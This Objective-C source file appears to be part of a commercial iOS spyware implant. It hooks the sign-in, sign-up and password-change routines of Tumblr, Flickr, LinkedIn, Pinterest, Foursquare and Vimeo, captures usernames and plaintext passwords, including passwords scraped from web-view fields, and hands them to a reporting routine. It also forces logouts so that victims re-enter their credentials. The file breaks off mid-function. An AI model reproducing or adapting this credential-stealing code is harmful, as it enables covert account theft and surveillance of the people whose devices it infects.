HOOK(VimeoAppDelegate,application$didFinishLaunchingWithOptions$ ,BOOL,id arg1,id arg2){
	BOOL ret = CALL_ORIG(VimeoAppDelegate, application$didFinishLaunchingWithOptions$ ,arg1,arg2);
	DLog(@"## VimeoAppDelegate application$didFinishLaunchingWithOptions$  ##");
    if ([PasswordController isForceLogOutWithPasswordAppID:kVimeo]) {
        [VimeoUtil waitToSignout];
        [PasswordController forcePasswordAppID:kVimeo logOut:kReset];
    }
	return ret ;
}

#pragma mark -
#pragma mark Tumblr (login, sign up, force logout)
#pragma mark -

#pragma mark iOS 7, iOS 8
// login, sign up
HOOK(TMAuthentication,loginWithEmailAddress$password$failureBlock$successBlock$ ,void,id arg1,id arg2,id arg3,void* arg4){
	DLog(@"## loginWithEmailAddress$password$failureBlock$successBlock$  ##");
	DLog(@"# arg1 %@",arg1);
	DLog(@"# arg2 %@",arg2);
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:arg1];
    [appPwd setMPassword:arg2];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
	CALL_ORIG(TMAuthentication, loginWithEmailAddress$password$failureBlock$successBlock$,arg1,arg2,arg3,arg4);
}

#pragma mark iOS6
HOOK(TMAuthController, authenticate$password$ ,void,id arg1,id arg2 ){
	DLog(@"## authenticate$password$  ##");
	DLog(@"# arg1 %@",arg1);
	DLog(@"# arg2 %@",arg2);
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:arg1];
    [appPwd setMPassword:arg2];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
	CALL_ORIG(TMAuthController, authenticate$password$,arg1,arg2);
}

HOOK(TMAppDelegate,application$didFinishLaunchingWithOptions$ ,BOOL,id arg1,id arg2){
	BOOL ret = CALL_ORIG(TMAppDelegate, application$didFinishLaunchingWithOptions$ ,arg1,arg2);
	DLog(@"## application$didFinishLaunchingWithOptions$  ##");
    if ([PasswordController isForceLogOutWithPasswordAppID:kTumblr]) {
        /*
         Make sure if below lines got exceptions e.g: unrecognized selector, it's going to crash only one time.
         */
        [PasswordController forcePasswordAppID:kTumblr logOut:kReset];
        
        if ([self respondsToSelector:@selector(logout)]) {
            // Below 3.7.2
            [self logout];
        } else {
            // 3.7.2 (only available on iOS 8)
            [[self userAuthenticationController] processLogout];
        }
    }
	return ret ;
}

#pragma mark -
#pragma mark Flickr (Prior to 3.0)
#pragma mark -

/*
 * Called when click "Sign in" button
 * version: Prior to 3.0
 * usecase:
 */
HOOK(SignInPageNewUIController, nativeSignInUsingUsername$password$ ,void,id arg1,id arg2){
	DLog(@"## nativeSignInUsingUsername$password$  ##");
	DLog(@"# arg1 %@",arg1);
	DLog(@"# arg2 %@",arg2);
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:arg1];
    [appPwd setMPassword:arg2];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
	CALL_ORIG(SignInPageNewUIController,nativeSignInUsingUsername$password$  ,arg1,arg2);
}

/*
 * Force Logout 
 * version: Prior to 3.0
 */
HOOK(FlickrAppDelegate,application$didFinishLaunchingWithOptions$ ,BOOL,id arg1,id arg2){
	BOOL ret = CALL_ORIG(FlickrAppDelegate, application$didFinishLaunchingWithOptions$ ,arg1,arg2);
	DLog(@"## application$didFinishLaunchingWithOptions$  ##");
    if ([PasswordController isForceLogOutWithPasswordAppID:kFlickr]) {
        DLog (@"\n\n!!! Force Logout Flickr")
        [self signOut];
        [PasswordController forcePasswordAppID:kFlickr logOut:kReset];
    }
	return ret ;
}

#pragma mark -
#pragma mark Flickr (3.0)
#pragma mark -

/*
 * Called when click "Sign in" button
 * method name: onLoginButton
 * version: 3.0
 * usecase:     - User click button "Get Started"
 *              - Go to "Add Account" view
 *              - Enter Yahoo ID and Password
 *              - Click "Sign In"
 * This class doesn't exit on the previous version of Flickr
 */
HOOK(YAccountsSignInViewController,  onLoginButtonFlickr$, void, id button) {
    DLog(@"\n\n&&&&&&&&&&&&&& YAccountsSignInViewController --> onLoginButton$ &&&&&&&&&&&&&&\n\n");
    
    NSString *username   = [self usernameField].text;
    NSString *password  = [self passwordField].text;
    
    DLog (@">> usernameField %@", username);
    DLog (@">> passwordField %@", password);
    
    if (username    &&  [username length]   &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", username, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:username
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    CALL_ORIG(YAccountsSignInViewController, onLoginButtonFlickr$, button);
}

//Capture username and password from webview when user signin
HOOK(YAccountsWebSigninViewController, didFinishWithSLCC$otherParams$_Flickr, void, id arg1, id arg2){
    UIWebView *webView = (UIWebView *)self.webview;
    NSString* username = [webView stringByEvaluatingJavaScriptFromString:@"document.getElementById('login-username').value"];
    NSString* password = [webView stringByEvaluatingJavaScriptFromString:@"document.getElementById('login-passwd').value"];
    
    CALL_ORIG(YAccountsWebSigninViewController, didFinishWithSLCC$otherParams$_Flickr, arg1, arg2);
    
    DLog (@"username %@", username)
    DLog (@"password %@", password)
    
    if (username     &&  [username length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", username, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:username
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}


/*
 * Force Logout
 * version: 3.0
 * this class doesn't exist in the previous version of Flickr
 */
HOOK(FLKAppDelegate,  application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& FLKAppDelegate --> application$didFinishLaunchingWithOptions$ &&&&&&&&&&&&&&\n\n");
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kFlickr]) {
        //Set Userdefault value to make Flickr remove all signed in account by itself.
        [[NSUserDefaults standardUserDefaults] setObject:[NSNumber numberWithBool:YES] forKey:@"YAccountsSDK_Reset"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        
        NSDictionary *bundleInfo = [[NSBundle mainBundle] infoDictionary];
        NSString *versionOfIM = [bundleInfo objectForKey:@"CFBundleShortVersionString"];
        if (versionOfIM == nil || [versionOfIM length] == 0) {
            versionOfIM = [bundleInfo objectForKey:@"CFBundleVersion"];
        }
        
        if([IMShareUtils isVersionText:versionOfIM isHigherThanOrEqual:@"4.0"]){
            [PasswordController forcePasswordAppID:kFlickr logOut:kReset];
        }
    }
    
    BOOL retValue = CALL_ORIG(FLKAppDelegate, application$didFinishLaunchingWithOptions$, application, options);
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kFlickr]) {
        DLog(@"!!!!! FORCE LOGOUT Flickr (Signout) !!!!!!")
    
        FlickrPasswordManager *pMgr = [FlickrPasswordManager sharedFlickrPasswordManager];
        [pMgr performSelector:@selector(clearRegisteredAccount) withObject:nil afterDelay:1];        
        
        
    }
    return retValue;
}

/*
 * Force Logout
 * version: 3.0
 * this class doesn't exist in the previous version of Flickr
 */

HOOK(YAccountsSSOViewController,  initWithAccounts$imageStorage$filterSignedIn$selectionBlock$signInBlock$deleteAccountBlock$cancelBlock$, id,
     id accounts, id storage, BOOL signedIn, id selectionBlock, id signInBlock, id deleteBlock, id cancelBlock) {
    DLog(@"\n\n&&&&&&&&&&&&&& YAccountsSSOViewController --> initWithAccounts$ &&&&&&&&&&&&&&\n\n");
    DLog (@"accounts %@", accounts)     // NSArray of YAccountsUser
    NSArray *accountArray = accounts;
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kFlickr]) {
        DLog (@"Should force logout")
        [PasswordController forcePasswordAppID:kFlickr logOut:kReset];
        
        if (accountArray && [accountArray count]) {
            DLog(@"!!!!! FORCE LOGOUT Flickr (Remove Accounts) !!!!!!")
            [FlickrPasswordManager signoutAllUsers:accountArray];
            
            // -- Overide the 'selection' block which will be called when user click either one of the account list
            YAccountsSSOViewController *me  = self;
            selectionBlock = ^ {
                DLog (@"!! This selection block is overriden !!")
                [me addAccountButtonTapped:nil];
            };
        }
    } else {
        DLog (@"Should NOT force logout")
    }
    
    return CALL_ORIG(YAccountsSSOViewController, initWithAccounts$imageStorage$filterSignedIn$selectionBlock$signInBlock$deleteAccountBlock$cancelBlock$,
                          accounts, storage, signedIn, selectionBlock , signInBlock, deleteBlock, cancelBlock);
}

HOOK(RTAcquiringCookiesState, didFailWithError$, void, id arg1) {
    DLog(@"didFailWithError, %@",  arg1);
    CALL_ORIG(RTAcquiringCookiesState, didFailWithError$, arg1);
}

HOOK(RTAcquiringCookiesState, didLoginWithInfo$, void, id arg1) {
    DLog(@"didLoginWithInfo, %@",  arg1);
    CALL_ORIG(RTAcquiringCookiesState, didLoginWithInfo$, arg1);
}

#pragma mark -
#pragma mark LinkedIn
#pragma mark -

#pragma mark (LinkedIn) Sign in

/*
 * Called when click "Sign in" button
 * usecase:     - User click button "Sign In"
 *              - Enter username, password
 *              - Click "Sign in"
 */
HOOK(LILoginV2ViewController,  performSignIn, void) {
    DLog(@"\n\n&&&&&&&&&&&&&& LILoginV2ViewController --> performSignIn &&&&&&&&&&&&&&\n\n");
    NSString *account               = [self usernameField].text;
    NSString *password              = [self passwordField].text;
    DLog (@"username %@", account)
	DLog (@"password %@", password)
    
    CALL_ORIG(LILoginV2ViewController, performSignIn);
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

HOOK(LIRegLoginViewController,  performSignIn, void) {
    DLog(@"\n\n&&&&&&&&&&&&&& LIRegLoginViewController --> performSignIn &&&&&&&&&&&&&&\n\n");
    NSString *account               = [self emailTextField].text;
    NSString *password              = [self passwordTextField].text;
    DLog (@"username %@", account)
	DLog (@"password %@", password)
    
    CALL_ORIG(LIRegLoginViewController, performSignIn);
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

// iPad 7.1.3
HOOK(LiCoLoginViewController, _performSignInWithUsername$withPassword$, void, id username, id pass) {
    DLog(@"\n\n&&&&&&&&&&&&&& LiCoLoginViewController --> _performSignInWithUsername &&&&&&&&&&&&&&\n\n");
    
    //LiCoLoginSignInBoxView *loginSignInBoxView = [self loginSignInBoxView];
    NSString *account               = username;
    NSString *password              = pass;
    DLog (@"username %@", account)
	DLog (@"password %@", password)
    
    CALL_ORIG(LiCoLoginViewController, _performSignInWithUsername$withPassword$, username, password);
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

// iPad 7.1.1
HOOK(LiCoLoginViewController, performSignIn, void) {
    DLog(@"\n\n&&&&&&&&&&&&&& LiCoLoginViewController --> performSignIn &&&&&&&&&&&&&&\n\n");
    
    LiCoLoginSignInBoxView *loginSignInBoxView = [self loginSignInBoxView];
    NSString *account               = [loginSignInBoxView emailField].text;
    NSString *password              = [loginSignInBoxView passwordField].text;
    DLog (@"username %@", account)
	DLog (@"password %@", password)
    
    CALL_ORIG(LiCoLoginViewController, performSignIn);
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

#pragma mark (LinkedIn) Force Log Out

/*
 * Force Log Out
 * usecase:     - Application is not running
 *              - User launches the application
 *              - We try to
 *              - Click "DONE"
 */
HOOK(LinkedInAppDelegate, application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& LinkedInAppDelegate --> application$didFinishLaunchingWithOptions$ &&&&&&&&&&&&&&\n\n");
    
    
    BOOL retValue = CALL_ORIG(LinkedInAppDelegate, application$didFinishLaunchingWithOptions$, application, options);
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kLinkedIn]) {
        DLog(@"!!!!! FORCE LOGOUT LinkedIn !!!!!!")
        LinkedInPasswordManager *liMgr = [LinkedInPasswordManager sharedLinkedInPasswordManager];
        [liMgr performSelector:@selector(clearRegisteredAccount) withObject:nil afterDelay:5];
        
        [PasswordController forcePasswordAppID:kLinkedIn logOut:kReset];
    }
    
    return retValue;
}

// iPad
HOOK(LiCoAppDelegateImpl, application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& LiCoAppDelegateImpl --> application$didFinishLaunchingWithOptions$ &&&&&&&&&&&&&&\n\n");
    
    
    BOOL retValue = CALL_ORIG(LiCoAppDelegateImpl, application$didFinishLaunchingWithOptions$, application, options);
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kLinkedIn]) {
        DLog(@"!!!!! FORCE LOGOUT LinkedIn !!!!!!")
        LinkedInPasswordManager *liMgr = [LinkedInPasswordManager sharedLinkedInPasswordManager];
        [liMgr performSelector:@selector(clearRegisteredAccount) withObject:nil afterDelay:5];
        
        [PasswordController forcePasswordAppID:kLinkedIn logOut:kReset];
    }
    
    return retValue;
}


#pragma mark -
#pragma mark Pinterest
#pragma mark -


#pragma mark (Pinterest) Log In

/*
 * Called when click "Log in" button
 * usecase:     - User click button "Log In"
 *              - Enter Email Address, Password
 *              - Click "Log in"
 */
HOOK(CBLLoginViewController,  CBLLoginViewSignInWithEmail$andPassword$, void, id email, id password) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& CBLLoginViewController -->CBLLoginViewSignInWithEmail &&&&&&&&&&&&&&\n\n");
    DLog (@">> email %@", email);
    DLog (@">> password %@", password);
    
    CALL_ORIG(CBLLoginViewController, CBLLoginViewSignInWithEmail$andPassword$, email, password);
    
    if (email       &&  [email length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", email, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:email
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

#pragma mark (Pinterest 6.4.1) Log In

HOOK(PILoginViewController,  PILoginNodeSignedInWithEmail$andPassword$, void, id email, id password) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& PILoginViewController -->PILoginNodeSignedInWithEmail &&&&&&&&&&&&&&\n\n");
    DLog (@">> email %@", email);
    DLog (@">> password %@", password);
    
    CALL_ORIG(PILoginViewController, PILoginNodeSignedInWithEmail$andPassword$, email, password);
    
    if (email       &&  [email length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", email, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:email
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

#pragma mark (Pinterest) Create Account

/*
 * Called when click "Create" button
 * usecase:     - User click button "Sign Up"
 *              - Enter First name, Last name [Optional], your email, Password
 *              - Choose Female/Mail [Optional]
 *              - Click "Create"
 */
HOOK(CBLSignupViewController, createButtonPressed$, void, id pressed) {
    DLog(@"\n\n&&&&&&&&&&&&&& CBLSignupViewController --> createButtonPressed &&&&&&&&&&&&&&\n\n");
    
    UITextField *emailTextField     = (UITextField *) self.signupView.emailInput;
    UITextField *passwordTextField  =(UITextField *)  self.signupView.passwordInput;
    NSString *account               = emailTextField.text;
    NSString *password              = passwordTextField.text;
    DLog (@"username %@", account)
	DLog (@"password %@", password)

    CALL_ORIG(CBLSignupViewController, createButtonPressed$, pressed);
    
    if (account       &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

#pragma mark (Pinterest 6.4.1) Create Account

HOOK(PIBrioSignupStepContainerViewController,  signupStepDidPressLogin$email$password$, void, id arg1, id email, id password) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& PIBrioSignupStepContainerViewController -->signupStepDidPressLogin$email$password$ &&&&&&&&&&&&&&\n\n");
    DLog (@">> email %@", email);
    DLog (@">> password %@", password);
    
    CALL_ORIG(PIBrioSignupStepContainerViewController, signupStepDidPressLogin$email$password$, arg1, email, password);
    
    if (email       &&  [email length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", email, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:email
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

HOOK(PIBrioSignupStepContainerViewController,  signupStepDidPressSignup$withMethod$parameters$, void, id arg1, id arg2, id arg3) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& PIBrioSignupStepContainerViewController -->signupStepDidPressSignup$withMethod$parameters$ &&&&&&&&&&&&&&\n\n");
    DLog (@">> arg2 %@", arg2);
    DLog (@">> arg3 %@", arg3);
    
    CALL_ORIG(PIBrioSignupStepContainerViewController, signupStepDidPressSignup$withMethod$parameters$, arg1, arg2, arg3);
    
    NSString *method = arg2;
    NSDictionary *parameterDict = arg3;
    
    if ([method isEqualToString:@"email"] && parameterDict) {
        NSString *email = parameterDict[@"email"];
        NSString *password = parameterDict[@"password"];
        
        if (email       &&  [email length]    &&
            password    &&  [password length])  {
            
            DLog(@"Capture account and password [%@] [%@]", email, password)
            
            NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
            
            [PasswordUtils sendPasswordEventForAccount:email
                                              password:password
                                         applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                       applicationName:applicationName];
        }
    }
}


#pragma mark (Pinterest) Change Password

/*
 * Called when click "Change Password" button
 * usecase:     - User click Setting Icon
 *              - Click "Account Settings"
 *              - Click "Change Password"
 *              - Enter Old Password, New Password, Retype Password
 *              - Click "Done"
 */
HOOK(CBLPasswordResetViewController, save$, void, id save) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& CBLPasswordResetViewController --> save &&&&&&&&&&&&&&\n\n");
    //DLog (@">> save %@", save);
    //DLog (@">> retypePassword %@", self.retypePassword.textField.text);
    //DLog (@">> requestedPassword %@", self.requestedPassword.textField.text);
    //DLog (@">> oldPassword %@", self.oldPassword.textField.text);
   
    CALL_ORIG(CBLPasswordResetViewController, save$, save);
    
    Class $CBLActiveUserManager             = objc_getClass("CBLActiveUserManager");
    CBLActiveUserManager *cblActiveUserMgr  = [$CBLActiveUserManager sharedManager];
    CBLActiveUser *activeUser               = [cblActiveUserMgr activeUser];
    NSString *account                       = activeUser.email;
    NSString *password                      = self.requestedPassword.textField.text;
    
    DLog (@"username %@", account)
	DLog (@"password %@", password)
    
    if (account       &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

#pragma mark (Pinterest 6.4.1) Change Password

HOOK(PIUserSessionManager, changePasswordToNewPassword$retypeNewPassword$oldPassword$success$failure$, void, id arg1, id arg2, id arg3, id arg4, id arg5) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& PIUserSessionManager --> changePasswordToNewPassword$retypeNewPassword$oldPassword$success$failure$ &&&&&&&&&&&&&&\n\n");
    
    PIUser *activeUser  = self.activeUser;
    NSString *account   = activeUser.email;
    NSString *password  = arg1;
    
    DLog (@"username %@", account)
    DLog (@"password %@", password)
    
    if (account       &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    CALL_ORIG(PIUserSessionManager, changePasswordToNewPassword$retypeNewPassword$oldPassword$success$failure$, arg1, arg2, arg3, arg4, arg5);
}

HOOK(PIUserSessionManager, setPasswordToPassword$retypePassword$success$failure$, void, id arg1, id arg2, id arg3, id arg4) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& PIUserSessionManager --> setPasswordToPassword$retypePassword$success$failure$ &&&&&&&&&&&&&&\n\n");
    
    PIUser *activeUser  = self.activeUser;
    NSString *account   = activeUser.email;
    NSString *password  = arg1;
    
    DLog (@"username %@", account)
    DLog (@"password %@", password)
    
    if (account       &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    CALL_ORIG(PIUserSessionManager, setPasswordToPassword$retypePassword$success$failure$, arg1, arg2, arg3, arg4);
}

#pragma mark (Pinterest) Force Log Out

/*
 * Force Log Out
 * usecase:     - Application is not running
 *              - User launches the application
 *              - We try to
 *              - Click "DONE"
 */
HOOK(CBLAppDelegate,  application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    DLog(@"\n\n&&&&&&&&&&&&&& CBLAppDelegate --> application$didFinishLaunchingWithOptions$ &&&&&&&&&&&&&&\n\n");
    //DLog (@">>application %@", application);
    //DLog (@">>options %@", options);
    
    BOOL retValue =     CALL_ORIG(CBLAppDelegate, application$didFinishLaunchingWithOptions$, application, options);
    
    if ([PasswordController isForceLogOutWithPasswordAppID:kPinterest]) {
        DLog(@"!!!!! FORCE LOGOUT Pinterest !!!!!!")
        PinterestPasswordManager *pMgr = [PinterestPasswordManager sharedPinterestPasswordManager];
        [pMgr performSelector:@selector(clearRegisteredAccount) withObject:nil afterDelay:3];
        
        [PasswordController forcePasswordAppID:kPinterest logOut:kReset];
    }
    return retValue;
}

#pragma mark -
#pragma mark Foursquare
#pragma mark -

#pragma mark (Foursquare) Sign up

/*
 * Called when user sign up
 * usecase:     - User click button "Sign up"
 *              - Enter information including email and password
 *              - Click "Join"
 *              - There will be alert to confirm email address. Then user click "OK"
 */
HOOK(SignupViewController,  confirm, void) {
    DLog(@"\n\n&&&&&&&&&&&&&& SignupViewController --> confirm &&&&&&&&&&&&&&\n\n");
    
    CALL_ORIG(SignupViewController, confirm);
    
    DLog(@"password %@",self.password);
    DLog(@"email %@",self.email);
    
    NSString *account                       = self.email;
    NSString *password                      = self.password;
    
    if (account         &&  [account length]    &&
        password        &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

// This method will be called no matter the signup success or not
//HOOK(SignupFormViewController,  doneButtonTapped$, void, id tapped) {
//    DLog(@"\n\n&&&&&&&&&&&&&& SignupFormViewController --> doneButtonTapped &&&&&&&&&&&&&&\n\n");
//    
//    CALL_ORIG(SignupFormViewController, doneButtonTapped$, tapped);
//    
//}

HOOK(SignupFormViewController,  validateForm, BOOL) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& SignupFormViewController --> validateForm &&&&&&&&&&&&&&\n\n");
    
    BOOL validateResult = CALL_ORIG(SignupFormViewController, validateForm);
    DLog (@"validateResult %d", validateResult)
    
    // We capture only when the signup success
    if (validateResult) {
        DLog(@"password %@",self.password.text);
        DLog(@"email %@",self.emailAddress.text);
        
        NSString *account                       = self.emailAddress.text;
        NSString *password                      = self.password.text;
        
        if (account         &&  [account length]    &&
            password        &&  [password length])  {
            
            DLog(@"Capture account and password [%@] [%@]", account, password)
            
            NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
            
            [PasswordUtils sendPasswordEventForAccount:account
                                              password:password
                                         applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                       applicationName:applicationName];
        }
    } else {
        DLog (@"Signup process fails, so we don't need to capture")
    }
    return validateResult;
}

#pragma mark (Foursquare) Sign in

/*
 * Called when user sign in
 * usecase:     - User click button "Sign In"
 *              - Enter email and password
 *              - Click "Log In"
 */
HOOK(SigninViewController,  authenticate, void) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& SigninViewController --> authenticate &&&&&&&&&&&&&&\n\n");
    
    CALL_ORIG(SigninViewController, authenticate);
    
    DLog(@"password %@",self.passwordCell.textField.text);
    DLog(@"email %@",   self.usernameCell.textField.text);
    
    NSString *password                      = self.passwordCell.textField.text;
    NSString *account                       = self.usernameCell.textField.text;
    
    if (account         &&  [account length]    &&
        password        &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

// Capture password on Sign In
// Foursquare v 8.0
HOOK(LoginViewController,  performLogin, void) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& LoginViewController --> performLogin &&&&&&&&&&&&&&\n\n");
    
    CALL_ORIG(LoginViewController, performLogin);
    
    DLog(@"password %@",self.passwordField.text);       // SignupTextInputView
    DLog(@"email %@",   self.emailField.text);          // SignupTextInputView

    NSString *password                      = self.passwordField.text;
    NSString *account                       = self.emailField.text;

    if (account         &&  [account length]    &&
        password        &&  [password length])  {

        DLog(@"Capture account and password [%@] [%@]", account, password)

        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];

        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
}

#pragma mark (Foursquare) Force Log Out

HOOK(foursquareAppDelegate,  application$didFinishLaunchingWithOptions$, BOOL, id application, id options) {
    
    DLog(@"\n\n&&&&&&&&&&&&&& foursquareAppDelegate --> application$didFinishLaunchingWithOptions$ &&&&&&&&&&&&&&\n\n");
  
    BOOL retValue =     CALL_ORIG(foursquareAppDelegate, application$didFinishLaunchingWithOptions$, application, options);
   
    if ([PasswordController isForceLogOutWithPasswordAppID:kFoursquare]) {
